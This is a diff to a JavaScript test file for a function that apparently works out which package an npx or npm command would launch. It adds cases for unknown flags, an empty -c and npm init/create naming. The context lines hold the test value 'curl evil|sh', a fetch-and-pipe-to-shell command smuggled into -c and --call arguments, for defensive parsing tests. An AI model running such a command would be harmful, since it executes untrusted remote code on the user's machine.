@@ -355,6 +355,22 @@ describe('npxPackageArg', () => {
     ['npx', ['--package=@modelcontextprotocol/server-filesystem', '-c', 'curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
     ['npx', ['--package=@modelcontextprotocol/server-filesystem', '--call=curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
     ['npx', ['--package=@modelcontextprotocol/server-filesystem', 'mcp-server-filesystem'], '@modelcontextprotocol/server-filesystem'],
+    // unknown value-taking flag: fail closed, an unknown package must not vanish
+    ['npx', ['--logs-dir', '@modelcontextprotocol/server-filesystem', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--scope', 'acme', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--install-strategy', 'nested', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['--made-up-flag', 'postmark-mcp', 'other'], 'postmark-mcp'],
+    ['npx', ['--made-up-flag', './dir', 'evil-pkg'], 'evil-pkg'],
+    ['npx', ['-y', '@modelcontextprotocol/server-filesystem', '/tmp'], '@modelcontextprotocol/server-filesystem'],
+    // empty -c grades nothing
+    ['npm', ['exec', '-c', ''], undefined],
+    // npm init/create run create-<pkg>; other subcommands run no package
+    ['npm', ['init', 'vite'], 'create-vite'],
+    ['npm', ['create', 'vite@5'], 'create-vite@5'],
+    ['npm', ['init', '@acme'], '@acme/create'],
+    ['npm', ['init', '@acme/app'], '@acme/create-app'],
+    ['npm', ['install', 'left-pad'], undefined],
+    ['npm', ['run', 'dev'], undefined],
     // negatives: exec is only a subcommand under npm, and only once
     ['npx', ['-y', 'exec'], 'exec'],
     ['npm', ['exec', 'x'], 'x'],
